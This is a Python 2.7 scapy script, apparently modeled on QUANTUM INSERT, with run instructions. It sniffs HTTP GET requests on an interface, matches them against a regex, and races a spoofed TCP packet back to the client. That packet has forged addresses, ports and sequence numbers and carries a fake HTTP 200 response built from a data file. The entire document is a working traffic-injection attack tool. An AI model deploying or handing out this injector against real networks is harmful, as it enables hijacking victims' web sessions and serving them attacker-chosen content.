# python 2.7
# how to run: python quantum.py --interface some_network_interface --regexp some_regular_expression --datafile some_filepath some_expression_for_filtering
# example that I used during testing: python quantum.py --interface en0 --regexp chewbacca --datafile datafile.txt "tcp and port 80"
import argparse
from scapy.all import *
import re
from time import *

parser = argparse.ArgumentParser(description='idk')
parser.add_argument("-i", "--interface", default="en0", help="Network interface to listen on")
parser.add_argument("-r", "--regexp", help="A regular expression that will be used to flag packets")
parser.add_argument("-d", "--datafile", help="Used as the TCP Raw payload for the injected packet(s)")
parser.add_argument("expression", default="tcp and port 80", help="A filter for packet sniffing (eg 'tcp and port 80' for HTTP-only). MUST BE SURROUNDED BY QUOTATION MARKS")

args = parser.parse_args()
# print args
# print args.interface
# print args.regexp
# print args.datafile
# print args.expression

stars = lambda n: "*" * n

def GET_print(packet):
    return "\n".join((
        stars(40) + "GET PACKET" + stars(40),
        packet.sprintf("{Raw:%Raw.load%}"),
        stars(90)))

# callback, called for each sniffed packet
# Determine whether we should allow it or not.
def determine_bad_packet(packet):
    print packet[IP].src, packet[IP].dst
    # compile the given regex for use
    regex = re.compile(args.regexp)
    # If the regex has any matches in the tcp
    # payload, we should inject a packet!
    try:
        packet[TCP][Raw]
    except IndexError:
        return
    else:
        if re.search(regex, packet[TCP][Raw].load):
            print 'matched'
            print GET_print(packet)
            print packet[TCP][Raw].load
            inject_packet(packet)

#helper function to send the packet
def send_packet (to_inject):
    # Use some magic to prep the packet for sending
    to_inject = to_inject.__class__(str(to_inject))
    sendp(to_inject)

#helper function to form the packet's key properties
def form_packet (payload, flagged_packet):
    to_inject = Ether()/IP()/TCP()/payload
    print payload
    #Ether fields
    to_inject[Ether].src = flagged_packet[Ether].dst
    to_inject[Ether].dst = flagged_packet[Ether].src
    # IP fields
    to_inject[IP].src = flagged_packet[IP].dst
    to_inject[IP].dst = flagged_packet[IP].src
    to_inject[IP].id = flagged_packet[IP].id + 112
    # TCP fields
    print 'tcp old packet sequence number: '
    print flagged_packet[TCP].seq
    print 'tcp new packet sequence number'
    print len(flagged_packet[Raw])
    print 'plus '
    print flagged_packet[TCP].seq
    print 'equals'
    print len(flagged_packet[Raw]) + flagged_packet[TCP].seq
    to_inject[TCP].sport = flagged_packet[TCP].dport
    to_inject[TCP].dport = flagged_packet[TCP].sport
    to_inject[TCP].ack = len(flagged_packet[Raw]) + flagged_packet[TCP].seq
    to_inject[TCP].seq = flagged_packet[TCP].ack

    to_inject[TCP].flags = "PA"
    del to_inject.chksum
    # We don't need to specify an outgoing interface,
    # scapy remembers where we're sniffing from
    send_packet(to_inject)

# Helper function to read the datafile
def read_datafile (flagged_packet):
    with open(args.datafile, 'r') as datafile:
        time = strftime("%a, %d %b %Y %H:%M:%S GMT", gmtime())
        header_template = "HTTP/1.1 200 OK\r\nDate: " + time + "\r\nServer: Apache\r\nCache-Control: public, max-age=300\r\nConnection: close\r\nContent-type: text/html\r\n\r\n"
        http_reponse = header_template + datafile.read()
        form_packet(http_reponse, flagged_packet)

# Given a flagged packet, injects a packet
# This function is essentially a wrapper for a bunch of helpers that call themselves sequentially
def inject_packet (flagged_packet):
    #to_inject = flagged_packet
    #print "flagged " + flagged_packet.summary()
    #http_headers = "HTTP / 1.1 400 Bad Request\r\nDate: Sun, 18 Oct 2012 10:36:20 GMT\r\nServer: Apache/2.2.14 (Win32)\r\nContent-Length: 230\r\nContent-Type: text/html; charset=iso-8859-1\r\n\Connection: Closed\r\n\r\n"
    #http_content="<html><head><title>400 Bad Request</title></head><body><h1>Bad Request</h1><p>Your browser sent a request that this server could not understand.</p><p>The request line contained invalid characters following the protocol string.</p></body></html>"
    read_datafile(flagged_packet)





# sniff the given interface for tcp packets
packets = sniff(iface=args.interface, filter=args.expression, lfilter=lambda p: "GET" in str(p),
    prn=determine_bad_packet)

# must check each packet individually
# for packet in  packets:
#     # re.match vs re.search?
#     # packet must be a string, so this may not work
#     # See if the packet matches the given regex
#     if(re.search(regex, packet)):
#         print packet
